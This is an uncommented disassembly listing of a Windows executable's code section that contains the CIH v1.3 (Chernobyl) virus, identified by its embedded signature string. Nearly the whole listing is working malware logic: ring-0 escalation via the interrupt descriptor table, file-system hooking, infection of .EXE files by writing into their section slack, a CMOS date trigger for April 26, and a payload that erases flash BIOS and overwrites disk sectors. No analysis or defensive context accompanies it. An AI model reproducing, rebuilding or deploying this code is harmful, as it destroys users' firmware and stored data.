                           .text:00401000 c3                               ret    
                           .text:00401001 00 00                            add    %al,(%eax)
                           .text:00401003 00 00                            add    %al,(%eax)
                           .text:00401005 00 00                            add    %al,(%eax)
                           .text:00401007 00 00                            add    %al,(%eax)
                           .text:00401009 00 00                            add    %al,(%eax)
                           .text:0040100b 00 02                            add    %al,(%edx)
                           .text:0040100d 04 00                            add    $0x0,%al
                           .text:0040100f 00 55 8d                         add    %dl,-0x73(%ebp)
                           .text:00401012 44                               inc    %esp
                           .text:00401013 24 f8                            and    $0xf8,%al
                           .text:00401015 33 db                            xor    %ebx,%ebx
                           .text:00401017 64 87 03                         xchg   %eax,%fs:(%ebx)
                           .text:0040101a e8 00 00 00 00                   call   0x0040101f
                           .text:0040101f 5b                               pop    %ebx
                           .text:00401020 8d 4b 44                         lea    0x44(%ebx),%ecx
                           .text:00401023 51                               push   %ecx
                           .text:00401024 50                               push   %eax
                           .text:00401025 50                               push   %eax
                           .text:00401026 0f 01 4c 24 fe                   sidtl  -0x2(%esp)
                           .text:0040102b 5b                               pop    %ebx
                           .text:0040102c 83 c3 2c                         add    $0x2c,%ebx
                           .text:0040102f fa                               cli    
                           .text:00401030 8b 2b                            mov    (%ebx),%ebp
                           .text:00401032 66 8b 6b fc                      mov    -0x4(%ebx),%bp
                           .text:00401036 8d 71 12                         lea    0x12(%ecx),%esi
                           .text:00401039 56                               push   %esi
                           .text:0040103a 66 89 73 fc                      mov    %si,-0x4(%ebx)
                           .text:0040103e c1 ee 10                         shr    $0x10,%esi
                           .text:00401041 66 89 73 02                      mov    %si,0x2(%ebx)
                           .text:00401045 5e                               pop    %esi
                           .text:00401046 cd 05                            int    $0x5
                           .text:00401048 56                               push   %esi
                           .text:00401049 8b f0                            mov    %eax,%esi
                           .text:0040104b 8b 48 fc                         mov    -0x4(%eax),%ecx
                           .text:0040104e f3 a4                            rep movsb %ds:(%esi),%es:(%edi)
                           .text:00401050 83 e8 08                         sub    $0x8,%eax
                           .text:00401053 8b 30                            mov    (%eax),%esi
                           .text:00401055 0b f6                            or     %esi,%esi
                           .text:00401057 74 02                            je     0x0040105b
                           .text:00401059 eb f0                            jmp    0x0040104b
                           .text:0040105b 5e                               pop    %esi
                           .text:0040105c cd 05                            int    $0x5
                           .text:0040105e fb                               sti    
                           .text:0040105f 33 db                            xor    %ebx,%ebx
                           .text:00401061 eb 07                            jmp    0x0040106a
                           .text:00401063 33 db                            xor    %ebx,%ebx
                           .text:00401065 64 8b 03                         mov    %fs:(%ebx),%eax
                           .text:00401068 8b 20                            mov    (%eax),%esp
                           .text:0040106a 64 8f 03                         popl   %fs:(%ebx)
                           .text:0040106d 58                               pop    %eax
                           .text:0040106e 5d                               pop    %ebp
                           .text:0040106f 68 00 10 40 00                   push   $0x401000
                           .text:00401074 c3                               ret    
                           .text:00401075 74 32                            je     0x004010a9
                           .text:00401077 0f 21 c1                         mov    %db0,%ecx
                           .text:0040107a e3 10                            jecxz  0x0040108c
                           .text:0040107c 83 04 24 16                      addl   $0x16,(%esp)
                           .text:00401080 66 89 6b fc                      mov    %bp,-0x4(%ebx)
                           .text:00401084 c1 ed 10                         shr    $0x10,%ebp
                           .text:00401087 66 89 6b 02                      mov    %bp,0x2(%ebx)
                           .text:0040108b cf                               iret   
                           .text:0040108c 0f 23 c3                         mov    %ebx,%db0
                           .text:0040108f 6a 0f                            push   $0xf
                           .text:00401091 51                               push   %ecx
                           .text:00401092 6a ff                            push   $0xffffffff
                           .text:00401094 51                               push   %ecx
                           .text:00401095 51                               push   %ecx
                           .text:00401096 51                               push   %ecx
                           .text:00401097 6a 01                            push   $0x1
                           .text:00401099 6a 02                            push   $0x2
                           .text:0040109b cd 20                            int    $0x20
                           .text:0040109d 53                               push   %ebx
                           .text:0040109e 00 01                            add    %al,(%ecx)
                           .text:004010a0 00 83 c4 20 97 8d                add    %al,-0x7268df3c(%ebx)
                           .text:004010a6 46                               inc    %esi
                           .text:004010a7 9b                               fwait
                           .text:004010a8 cf                               iret   
                           .text:004010a9 8d 87 e2 fc ff ff                lea    -0x31e(%edi),%eax
                           .text:004010af 50                               push   %eax
                           .text:004010b0 cd 20                            int    $0x20
                           .text:004010b2 67 00 40 00                      add    %al,0x0(%bx,%si)
                           .text:004010b6 0f 23 c0                         mov    %eax,%db0
                           .text:004010b9 58                               pop    %eax
                           .text:004010ba 8b 4e 3d                         mov    0x3d(%esi),%ecx
                           .text:004010bd 8b 11                            mov    (%ecx),%edx
                           .text:004010bf 89 50 fc                         mov    %edx,-0x4(%eax)
                           .text:004010c2 8d 40 d6                         lea    -0x2a(%eax),%eax
                           .text:004010c5 89 01                            mov    %eax,(%ecx)
                           .text:004010c7 fa                               cli    
                           .text:004010c8 eb b6                            jmp    0x00401080
                           .text:004010ca 53                               push   %ebx
                           .text:004010cb e8 00 00 00 00                   call   0x004010d0
                           .text:004010d0 5b                               pop    %ebx
                           .text:004010d1 83 c3 24                         add    $0x24,%ebx
                           .text:004010d4 53                               push   %ebx
                           .text:004010d5 cd 20                            int    $0x20
                           .text:004010d7 68 00 40 00 58                   push   $0x58004000
                           .text:004010dc ff 74 24 08                      pushl  0x8(%esp)
                           .text:004010e0 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e3 59                               pop    %ecx
                           .text:004010e4 50                               push   %eax
                           .text:004010e5 53                               push   %ebx
                           .text:004010e6 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e9 59                               pop    %ecx
                           .text:004010ea 0f 23 c0                         mov    %eax,%db0
                           .text:004010ed 58                               pop    %eax
                           .text:004010ee 5b                               pop    %ebx
                           .text:004010ef c3                               ret    
                           .text:004010f0 00 00                            add    %al,(%eax)
                           .text:004010f2 00 00                            add    %al,(%eax)
                           .text:004010f4 60                               pusha  
                           .text:004010f5 e8 00 00 00 00                   call   0x004010fa
                           .text:004010fa 5e                               pop    %esi
                           .text:004010fb 81 c6 18 03 00 00                add    $0x318,%esi
                           .text:00401101 f6 06 01                         testb  $0x1,(%esi)
                           .text:00401104 0f 85 05 02 00 00                jne    0x0040130f
                           .text:0040110a 8d 5c 24 28                      lea    0x28(%esp),%ebx
                           .text:0040110e 83 3b 24                         cmpl   $0x24,(%ebx)
                           .text:00401111 0f 85 f2 01 00 00                jne    0x00401309
                           .text:00401117 fe 06                            incb   (%esi)
                           .text:00401119 83 c6 05                         add    $0x5,%esi
                           .text:0040111c 56                               push   %esi
                           .text:0040111d 8a 43 04                         mov    0x4(%ebx),%al
                           .text:00401120 3c ff                            cmp    $0xff,%al
                           .text:00401122 74 08                            je     0x0040112c
                           .text:00401124 04 40                            add    $0x40,%al
                           .text:00401126 b4 3a                            mov    $0x3a,%ah
                           .text:00401128 89 06                            mov    %eax,(%esi)
                           .text:0040112a 46                               inc    %esi
                           .text:0040112b 46                               inc    %esi
                           .text:0040112c 6a 00                            push   $0x0
                           .text:0040112e 6a 7f                            push   $0x7f
                           .text:00401130 8b 5b 10                         mov    0x10(%ebx),%ebx
                           .text:00401133 8b 43 0c                         mov    0xc(%ebx),%eax
                           .text:00401136 83 c0 04                         add    $0x4,%eax
                           .text:00401139 50                               push   %eax
                           .text:0040113a 56                               push   %esi
                           .text:0040113b cd 20                            int    $0x20
                           .text:0040113d 41                               inc    %ecx
                           .text:0040113e 00 40 00                         add    %al,0x0(%eax)
                           .text:00401141 83 c4 10                         add    $0x10,%esp
                           .text:00401144 81 7c 06 fc 2e 45 58 45          cmpl   $0x4558452e,-0x4(%esi,%eax,1)
                           .text:0040114c 5e                               pop    %esi
                           .text:0040114d 0f 85 b3 01 00 00                jne    0x00401306
                           .text:00401153 81 7c 06 fa 46 55 43 4b          cmpl   $0x4b435546,-0x6(%esi,%eax,1)
                           .text:0040115b 0f 85 a5 01 00 00                jne    0x00401306
                           .text:00401161 66 83 7b 18 01                   cmpw   $0x1,0x18(%ebx)
                           .text:00401166 0f 85 9a 01 00 00                jne    0x00401306
                           .text:0040116c 66 b8 00 43                      mov    $0x4300,%ax
                           .text:00401170 cd 20                            int    $0x20
                           .text:00401172 32 00                            xor    (%eax),%al
                           .text:00401174 40                               inc    %eax
                           .text:00401175 00 0f                            add    %cl,(%edi)
                           .text:00401177 82                               (bad)  
                           .text:00401178 8a 01                            mov    (%ecx),%al
                           .text:0040117a 00 00                            add    %al,(%eax)
                           .text:0040117c 51                               push   %ecx
                           .text:0040117d 8b be 5b fd ff ff                mov    -0x2a5(%esi),%edi
                           .text:00401183 8b 3f                            mov    (%edi),%edi
                           .text:00401185 f6 c1 01                         test   $0x1,%cl
                           .text:00401188 74 08                            je     0x00401192
                           .text:0040118a 66 b8 01 43                      mov    $0x4301,%ax
                           .text:0040118e 33 c9                            xor    %ecx,%ecx
                           .text:00401190 ff d7                            call   *%edi
                           .text:00401192 33 c0                            xor    %eax,%eax
                           .text:00401194 b4 d5                            mov    $0xd5,%ah
                           .text:00401196 33 c9                            xor    %ecx,%ecx
                           .text:00401198 33 d2                            xor    %edx,%edx
                           .text:0040119a 42                               inc    %edx
                           .text:0040119b 8b da                            mov    %edx,%ebx
                           .text:0040119d 43                               inc    %ebx
                           .text:0040119e ff d7                            call   *%edi
                           .text:004011a0 93                               xchg   %eax,%ebx
                           .text:004011a1 59                               pop    %ecx
                           .text:004011a2 9c                               pushf  
                           .text:004011a3 f6 c1 01                         test   $0x1,%cl
                           .text:004011a6 74 06                            je     0x004011ae
                           .text:004011a8 66 b8 01 43                      mov    $0x4301,%ax
                           .text:004011ac ff d7                            call   *%edi
                           .text:004011ae 9d                               popf   
                           .text:004011af 0f 82 51 01 00 00                jb     0x00401306
                           .text:004011b5 56                               push   %esi
                           .text:004011b6 9c                               pushf  
                           .text:004011b7 83 c6 7f                         add    $0x7f,%esi
                           .text:004011ba 33 c0                            xor    %eax,%eax
                           .text:004011bc b4 d6                            mov    $0xd6,%ah
                           .text:004011be 8b e8                            mov    %eax,%ebp
                           .text:004011c0 33 c9                            xor    %ecx,%ecx
                           .text:004011c2 b1 04                            mov    $0x4,%cl
                           .text:004011c4 33 d2                            xor    %edx,%edx
                           .text:004011c6 b2 3c                            mov    $0x3c,%dl
                           .text:004011c8 ff d7                            call   *%edi
                           .text:004011ca 8b 16                            mov    (%esi),%edx
                           .text:004011cc 4a                               dec    %edx
                           .text:004011cd 8b c5                            mov    %ebp,%eax
                           .text:004011cf ff d7                            call   *%edi
                           .text:004011d1 81 3e 00 50 45 00                cmpl   $0x455000,(%esi)
                           .text:004011d7 0f 85 11 01 00 00                jne    0x004012ee
                           .text:004011dd 53                               push   %ebx
                           .text:004011de 6a 00                            push   $0x0
                           .text:004011e0 6a 01                            push   $0x1
                           .text:004011e2 52                               push   %edx
                           .text:004011e3 57                               push   %edi
                           .text:004011e4 0f 23 cc                         mov    %esp,%db1
                           .text:004011e7 50                               push   %eax
                           .text:004011e8 8b c5                            mov    %ebp,%eax
                           .text:004011ea b1 52                            mov    $0x52,%cl
                           .text:004011ec 83 c2 07                         add    $0x7,%edx
                           .text:004011ef ff d7                            call   *%edi
                           .text:004011f1 8d 42 22                         lea    0x22(%edx),%eax
                           .text:004011f4 50                               push   %eax
                           .text:004011f5 8d 06                            lea    (%esi),%eax
                           .text:004011f7 50                               push   %eax
                           .text:004011f8 0f b7 46 0e                      movzwl 0xe(%esi),%eax
                           .text:004011fc 8d 54 10 12                      lea    0x12(%eax,%edx,1),%edx
                           .text:00401200 b0 28                            mov    $0x28,%al
                           .text:00401202 8a 0e                            mov    (%esi),%cl
                           .text:00401204 f6 e1                            mul    %cl
                           .text:00401206 8d 76 32                         lea    0x32(%esi),%esi
                           .text:00401209 50                               push   %eax
                           .text:0040120a 52                               push   %edx
                           .text:0040120b 56                               push   %esi
                           .text:0040120c 41                               inc    %ecx
                           .text:0040120d 51                               push   %ecx
                           .text:0040120e c1 e1 03                         shl    $0x3,%ecx
                           .text:00401211 51                               push   %ecx
                           .text:00401212 03 c8                            add    %eax,%ecx
                           .text:00401214 03 ca                            add    %edx,%ecx
                           .text:00401216 2b 4e 1c                         sub    0x1c(%esi),%ecx
                           .text:00401219 f7 d1                            not    %ecx
                           .text:0040121b 41                               inc    %ecx
                           .text:0040121c 66 81 f9 ba 00                   cmp    $0xba,%cx
                           .text:00401221 7c 7c                            jl     0x0040129f
                           .text:00401223 51                               push   %ecx
                           .text:00401224 91                               xchg   %eax,%ecx
                           .text:00401225 8b 46 f0                         mov    -0x10(%esi),%eax
                           .text:00401228 03 46 fc                         add    -0x4(%esi),%eax
                           .text:0040122b 89 86 a8 fb ff ff                mov    %eax,-0x458(%esi)
                           .text:00401231 8b c5                            mov    %ebp,%eax
                           .text:00401233 ff d7                            call   *%edi
                           .text:00401235 5b                               pop    %ebx
                           .text:00401236 5f                               pop    %edi
                           .text:00401237 59                               pop    %ecx
                           .text:00401238 57                               push   %edi
                           .text:00401239 03 d0                            add    %eax,%edx
                           .text:0040123b 52                               push   %edx
                           .text:0040123c 03 c6                            add    %esi,%eax
                           .text:0040123e 81 78 dc 7a 69 70 5f             cmpl   $0x5f70697a,-0x24(%eax)
                           .text:00401245 74 58                            je     0x0040129f
                           .text:00401247 50                               push   %eax
                           .text:00401248 8d 44 38 fc                      lea    -0x4(%eax,%edi,1),%eax
                           .text:0040124c 89 18                            mov    %ebx,(%eax)
                           .text:0040124e 53                               push   %ebx
                           .text:0040124f 03 d7                            add    %edi,%edx
                           .text:00401251 52                               push   %edx
                           .text:00401252 8d be 48 fb ff ff                lea    -0x4b8(%esi),%edi
                           .text:00401258 57                               push   %edi
                           .text:00401259 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:0040125c 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:0040125f bd 02 04 00 00                   mov    $0x402,%ebp
                           .text:00401264 eb 31                            jmp    0x00401297
                           .text:00401266 83 c2 28                         add    $0x28,%edx
                           .text:00401269 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:0040126c 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:0040126f 76 2c                            jbe    0x0040129d
                           .text:00401271 53                               push   %ebx
                           .text:00401272 83 e8 08                         sub    $0x8,%eax
                           .text:00401275 89 18                            mov    %ebx,(%eax)
                           .text:00401277 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:0040127a 03 5a 08                         add    0x8(%edx),%ebx
                           .text:0040127d 53                               push   %ebx
                           .text:0040127e 57                               push   %edi
                           .text:0040127f 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:00401282 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:00401285 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:00401288 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:0040128b 8b 18                            mov    (%eax),%ebx
                           .text:0040128d 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:00401290 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:00401297 2b eb                            sub    %ebx,%ebp
                           .text:00401299 76 09                            jbe    0x004012a4
                           .text:0040129b 03 fb                            add    %ebx,%edi
                           .text:0040129d e2 c7                            loop   0x00401266
                           .text:0040129f 0f 21 cc                         mov    %db1,%esp
                           .text:004012a2 eb 2e                            jmp    0x004012d2
                           .text:004012a4 01 28                            add    %ebp,(%eax)
                           .text:004012a6 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:004012aa 33 db                            xor    %ebx,%ebx
                           .text:004012ac 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:004012af 8d 86 a8 fc ff ff                lea    -0x358(%esi),%eax
                           .text:004012b5 b1 04                            mov    $0x4,%cl
                           .text:004012b7 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:004012bc 8b 94 8e 29 ff ff ff             mov    -0xd7(%esi,%ecx,4),%edx
                           .text:004012c3 89 50 02                         mov    %edx,0x2(%eax)
                           .text:004012c6 0f b6 94 31 28 ff ff ff          movzbl -0xd8(%ecx,%esi,1),%edx
                           .text:004012ce 2b c2                            sub    %edx,%eax
                           .text:004012d0 e2 e5                            loop   0x004012b7
                           .text:004012d2 0f 21 c8                         mov    %db1,%eax
                           .text:004012d5 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:004012d8 8b 38                            mov    (%eax),%edi
                           .text:004012da 59                               pop    %ecx
                           .text:004012db e3 0d                            jecxz  0x004012ea
                           .text:004012dd 8b f1                            mov    %ecx,%esi
                           .text:004012df b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:004012e4 5a                               pop    %edx
                           .text:004012e5 59                               pop    %ecx
                           .text:004012e6 ff d7                            call   *%edi
                           .text:004012e8 eb f0                            jmp    0x004012da
                           .text:004012ea 5b                               pop    %ebx
                           .text:004012eb 58                               pop    %eax
                           .text:004012ec f9                               stc    
                           .text:004012ed 9c                               pushf  
                           .text:004012ee 33 c0                            xor    %eax,%eax
                           .text:004012f0 b4 d7                            mov    $0xd7,%ah
                           .text:004012f2 ff d7                            call   *%edi
                           .text:004012f4 9d                               popf   
                           .text:004012f5 5e                               pop    %esi
                           .text:004012f6 73 31                            jae    0x00401329
                           .text:004012f8 8b df                            mov    %edi,%ebx
                           .text:004012fa 66 b8 03 43                      mov    $0x4303,%ax
                           .text:004012fe 8b 4e fc                         mov    -0x4(%esi),%ecx
                           .text:00401301 8b 7e fe                         mov    -0x2(%esi),%edi
                           .text:00401304 ff d3                            call   *%ebx
                           .text:00401306 fe 4e fb                         decb   -0x5(%esi)
                           .text:00401309 61                               popa   
                           .text:0040130a 0f 21 c0                         mov    %db0,%eax
                           .text:0040130d ff 20                            jmp    *(%eax)
                           .text:0040130f 8b dc                            mov    %esp,%ebx
                           .text:00401311 ff 73 38                         pushl  0x38(%ebx)
                           .text:00401314 ff 53 24                         call   *0x24(%ebx)
                           .text:00401317 59                               pop    %ecx
                           .text:00401318 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:0040131b 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:0040131f 75 06                            jne    0x00401327
                           .text:00401321 8b 41 28                         mov    0x28(%ecx),%eax
                           .text:00401324 89 46 01                         mov    %eax,0x1(%esi)
                           .text:00401327 61                               popa   
                           .text:00401328 c3                               ret    
                           .text:00401329 66 b8 08 07                      mov    $0x708,%ax
                           .text:0040132d e6 70                            out    %al,$0x70
                           .text:0040132f e4 71                            in     $0x71,%al
                           .text:00401331 86 e0                            xchg   %ah,%al
                           .text:00401333 e6 70                            out    %al,$0x70
                           .text:00401335 e4 71                            in     $0x71,%al
                           .text:00401337 66 35 26 04                      xor    $0x426,%ax
                           .text:0040133b 75 c9                            jne    0x00401306
                           .text:0040133d 66 bd f8 0c                      mov    $0xcf8,%bp
                           .text:00401341 8d 76 c7                         lea    -0x39(%esi),%esi
                           .text:00401344 bf 4c 38 00 80                   mov    $0x8000384c,%edi
                           .text:00401349 66 ba fe 0c                      mov    $0xcfe,%dx
                           .text:0040134d fa                               cli    
                           .text:0040134e ff d6                            call   *%esi
                           .text:00401350 66 bf 58 00                      mov    $0x58,%di
                           .text:00401354 4a                               dec    %edx
                           .text:00401355 66 c7 46 08 24 0f                movw   $0xf24,0x8(%esi)
                           .text:0040135b ff d6                            call   *%esi
                           .text:0040135d 8d 5e f4                         lea    -0xc(%esi),%ebx
                           .text:00401360 b8 55 55 0e 00                   mov    $0xe5555,%eax
                           .text:00401365 b9 aa 2a 0e 00                   mov    $0xe2aaa,%ecx
                           .text:0040136a ff d3                            call   *%ebx
                           .text:0040136c c6 00 60                         movb   $0x60,(%eax)
                           .text:0040136f 51                               push   %ecx
                           .text:00401370 e2 fe                            loop   0x00401370
                           .text:00401372 32 e4                            xor    %ah,%ah
                           .text:00401374 88 00                            mov    %al,(%eax)
                           .text:00401376 91                               xchg   %eax,%ecx
                           .text:00401377 e2 fe                            loop   0x00401377
                           .text:00401379 b8 55 55 0f 00                   mov    $0xf5555,%eax
                           .text:0040137e 59                               pop    %ecx
                           .text:0040137f b5 aa                            mov    $0xaa,%ch
                           .text:00401381 ff d3                            call   *%ebx
                           .text:00401383 c6 00 20                         movb   $0x20,(%eax)
                           .text:00401386 e2 fe                            loop   0x00401386
                           .text:00401388 b4 e0                            mov    $0xe0,%ah
                           .text:0040138a 88 00                            mov    %al,(%eax)
                           .text:0040138c 66 c7 46 08 0c 10                movw   $0x100c,0x8(%esi)
                           .text:00401392 ff d6                            call   *%esi
                           .text:00401394 33 db                            xor    %ebx,%ebx
                           .text:00401396 b7 81                            mov    $0x81,%bh
                           .text:00401398 53                               push   %ebx
                           .text:00401399 83 ec 2c                         sub    $0x2c,%esp
                           .text:0040139c 68 00 10 00 c0                   push   $0xc0001000
                           .text:004013a1 b7 08                            mov    $0x8,%bh
                           .text:004013a3 53                               push   %ebx
                           .text:004013a4 51                               push   %ecx
                           .text:004013a5 51                               push   %ecx
                           .text:004013a6 51                               push   %ecx
                           .text:004013a7 68 01 05 00 40                   push   $0x40000501
                           .text:004013ac 41                               inc    %ecx
                           .text:004013ad 51                               push   %ecx
                           .text:004013ae 51                               push   %ecx
                           .text:004013af 8b f4                            mov    %esp,%esi
                           .text:004013b1 81 ec ac 00 00 00                sub    $0xac,%esp
                           .text:004013b7 cd 20                            int    $0x20
                           .text:004013b9 04 00                            add    $0x0,%al
                           .text:004013bb 10 00                            adc    %al,(%eax)
                           .text:004013bd 66 83 7e 06 17                   cmpw   $0x17,0x6(%esi)
                           .text:004013c2 74 05                            je     0x004013c9
                           .text:004013c4 fe 46 4d                         incb   0x4d(%esi)
                           .text:004013c7 eb ee                            jmp    0x004013b7
                           .text:004013c9 01 5e 10                         add    %ebx,0x10(%esi)
                           .text:004013cc c6 46 4d 81                      movb   $0x81,0x4d(%esi)
                           .text:004013d0 eb e5                            jmp    0x004013b7
                           .text:004013d2 88 08                            mov    %cl,(%eax)
                           .text:004013d4 88 01                            mov    %al,(%ecx)
                           .text:004013d6 c6 00 80                         movb   $0x80,(%eax)
                           .text:004013d9 88 08                            mov    %cl,(%eax)
                           .text:004013db 88 01                            mov    %al,(%ecx)
                           .text:004013dd c3                               ret    
                           .text:004013de 97                               xchg   %eax,%edi
                           .text:004013df 87 d5                            xchg   %edx,%ebp
                           .text:004013e1 ef                               out    %eax,(%dx)
                           .text:004013e2 97                               xchg   %eax,%edi
                           .text:004013e3 87 d5                            xchg   %edx,%ebp
                           .text:004013e5 ec                               in     (%dx),%al
                           .text:004013e6 0c 44                            or     $0x44,%al
                           .text:004013e8 97                               xchg   %eax,%edi
                           .text:004013e9 87 d5                            xchg   %edx,%ebp
                           .text:004013eb ef                               out    %eax,(%dx)
                           .text:004013ec 97                               xchg   %eax,%edi
                           .text:004013ed 87 d5                            xchg   %edx,%ebp
                           .text:004013ef ee                               out    %al,(%dx)
                           .text:004013f0 c3                               ret    
                           .text:004013f1 00 3a                            add    %bh,(%edx)
                           .text:004013f3 66 35 53 00                      xor    $0x53,%ax
                           .text:004013f7 01 00                            add    %eax,(%eax)
                           .text:004013f9 68 00 40 00 41                   push   $0x41004000
                           .text:004013fe 00 40 00                         add    %al,0x0(%eax)
                           .text:00401401 32 00                            xor    (%eax),%al
                           .text:00401403 40                               inc    %eax
                           .text:00401404 00 43 49                         add    %al,0x49(%ebx)
                           .text:00401407 48                               dec    %eax
                           .text:00401408 20 76 31                         and    %dh,0x31(%esi)
                           .text:0040140b 2e 33 20                         xor    %cs:(%eax),%esp
                           .text:0040140e 54                               push   %esp
                           .text:0040140f 54                               push   %esp
                           .text:00401410 49                               dec    %ecx
                           .text:00401411 54                               push   %esp
                           .text:00401412 00 00                            add    %al,(%eax)
                           .text:00401414 00 00                            add    %al,(%eax)
                           .text:00401416 00 00                            add    %al,(%eax)
                           .text:00401418 00 00                            add    %al,(%eax)
                           .text:0040141a 00 00                            add    %al,(%eax)
                           .text:0040141c 00 00                            add    %al,(%eax)
                           .text:0040141e 00 00                            add    %al,(%eax)
                           .text:00401420 ce                               into   
                           .text:00401421 11 c6                            adc    %eax,%esi
                           .text:00401423 f6 d0                            not    %al
                           .text:00401425 28 d7                            sub    %dl,%bh
                           .text:00401427 25 90 9c 8e ba                   and    $0xba8e9c90,%eax
                           .text:0040142c bf 7f 00 00 60                   mov    $0x6000007f,%edi
                           .text:00401431 58                               pop    %eax
                           .text:00401432 70 00                            jo     0x00401434
                           .text:00401434 00 00                            add    %al,(%eax)
                           .text:00401436 00 00                            add    %al,(%eax)
                           .text:00401438 00 00                            add    %al,(%eax)
                           .text:0040143a 00 00                            add    %al,(%eax)
                           .text:0040143c 00 00                            add    %al,(%eax)
                           .text:0040143e 00 00                            add    %al,(%eax)
                           .text:00401440 00 00                            add    %al,(%eax)
                           .text:00401442 00 00                            add    %al,(%eax)
                           .text:00401444 00 00                            add    %al,(%eax)
                           .text:00401446 00 00                            add    %al,(%eax)
                           .text:00401448 00 00                            add    %al,(%eax)
                           .text:0040144a 00 00                            add    %al,(%eax)
                           .text:0040144c 00 00                            add    %al,(%eax)
                           .text:0040144e 00 00                            add    %al,(%eax)
                           .text:00401450 f0 85 d8                         lock test %ebx,%eax
                           .text:00401453 e0 1d                            loopne 0x00401472
                           .text:00401455 65 80 00 c0                      addb   $0xc0,%gs:(%eax)
                           .text:00401459 9c                               pushf  
                           .text:0040145a 8e ba bf 7f 00 00                mov    0x7fbf(%edx),%?
                           .text:00401460 90                               nop
                           .text:00401461 e0 9f                            loopne 0x00401402
                           .text:00401463 b5 bf                            mov    $0xbf,%ch
                           .text:00401465 7f 00                            jg     0x00401467
                           .text:00401467 00 00                            add    %al,(%eax)
                           .text:00401469 00 00                            add    %al,(%eax)
                           .text:0040146b 00 00                            add    %al,(%eax)
                           .text:0040146d 00 00                            add    %al,(%eax)
                           .text:0040146f 00 00                            add    %al,(%eax)
                           .text:00401471 00 00                            add    %al,(%eax)
                           .text:00401473 00 00                            add    %al,(%eax)
                           .text:00401475 00 00                            add    %al,(%eax)
                           .text:00401477 00 00                            add    %al,(%eax)
                           .text:00401479 00 00                            add    %al,(%eax)
                           .text:0040147b 00 00                            add    %al,(%eax)
                           .text:0040147d 00 00                            add    %al,(%eax)
                           .text:0040147f 00 00                            add    %al,(%eax)
                           .text:00401481 00 00                            add    %al,(%eax)
                           .text:00401483 00 00                            add    %al,(%eax)
                           .text:00401485 00 00                            add    %al,(%eax)
                           .text:00401487 00 00                            add    %al,(%eax)
                           .text:00401489 00 00                            add    %al,(%eax)
                           .text:0040148b 00 00                            add    %al,(%eax)
                           .text:0040148d 00 00                            add    %al,(%eax)
                           .text:0040148f 00 00                            add    %al,(%eax)
                           .text:00401491 00 00                            add    %al,(%eax)
                           .text:00401493 00 00                            add    %al,(%eax)
                           .text:00401495 00 00                            add    %al,(%eax)
                           .text:00401497 00 93 f9 57 14 63                add    %dl,0x631457f9(%ebx)
                           .text:0040149d df 3f                            fistpll (%edi)
                           .text:0040149f eb f8                            jmp    0x00401499
                           .text:004014a1 aa                               stos   %al,%es:(%edi)
                           .text:004014a2 cc                               int3   
                           .text:004014a3 b9 bf 7f 00 00                   mov    $0x7fbf,%ecx
                           .text:004014a8 b0 58                            mov    $0x58,%al
                           .text:004014aa 70 00                            jo     0x004014ac
                           .text:004014ac 00 00                            add    %al,(%eax)
                           .text:004014ae 00 00                            add    %al,(%eax)
                           .text:004014b0 00 00                            add    %al,(%eax)
                           .text:004014b2 00 00                            add    %al,(%eax)
                           .text:004014b4 00 00                            add    %al,(%eax)
                           .text:004014b6 00 00                            add    %al,(%eax)
                           .text:004014b8 00 00                            add    %al,(%eax)
                           .text:004014ba 00 00                            add    %al,(%eax)
                           .text:004014bc 00 00                            add    %al,(%eax)
                           .text:004014be 00 00                            add    %al,(%eax)
                           .text:004014c0 00 00                            add    %al,(%eax)
                           .text:004014c2 00 00                            add    %al,(%eax)
                           .text:004014c4 00 00                            add    %al,(%eax)
                           .text:004014c6 00 00                            add    %al,(%eax)
                           .text:004014c8 ae                               scas   %es:(%edi),%al
                           .text:004014c9 0b 37                            or     (%edi),%esi
                           .text:004014cb 0c 59                            or     $0x59,%al
                           .text:004014cd f3 03 fd                         repz add %ebp,%edi
                           .text:004014d0 30 76 e0                         xor    %dh,-0x20(%esi)
                           .text:004014d3 b9 bf 7f 00 00                   mov    $0x7fbf,%ecx
                           .text:004014d8 e8 90 4c 01 00                   call   0x0041616d
                           .text:004014dd 00 00                            add    %al,(%eax)
                           .text:004014df 00 00                            add    %al,(%eax)
                           .text:004014e1 00 00                            add    %al,(%eax)
                           .text:004014e3 00 00                            add    %al,(%eax)
                           .text:004014e5 00 00                            add    %al,(%eax)
                           .text:004014e7 00 00                            add    %al,(%eax)
                           .text:004014e9 00 00                            add    %al,(%eax)
                           .text:004014eb 00 00                            add    %al,(%eax)
                           .text:004014ed 00 00                            add    %al,(%eax)
                           .text:004014ef 00 00                            add    %al,(%eax)
                           .text:004014f1 00 00                            add    %al,(%eax)
                           .text:004014f3 00 00                            add    %al,(%eax)
                           .text:004014f5 00 00                            add    %al,(%eax)
                           .text:004014f7 00 00                            add    %al,(%eax)
                           .text:004014f9 00 00                            add    %al,(%eax)
                           .text:004014fb 00 00                            add    %al,(%eax)
                           .text:004014fd 00 00                            add    %al,(%eax)
                           .text:004014ff 00 00                            add    %al,(%eax)
                           .text:00401501 00 00                            add    %al,(%eax)
                           .text:00401503 00 00                            add    %al,(%eax)
                           .text:00401505 00 00                            add    %al,(%eax)
                           .text:00401507 00 00                            add    %al,(%eax)
                           .text:00401509 00 00                            add    %al,(%eax)
                           .text:0040150b 00 00                            add    %al,(%eax)
                           .text:0040150d 00 00                            add    %al,(%eax)
                           .text:0040150f 00 00                            add    %al,(%eax)
                           .text:00401511 00 00                            add    %al,(%eax)
                           .text:00401513 00 00                            add    %al,(%eax)
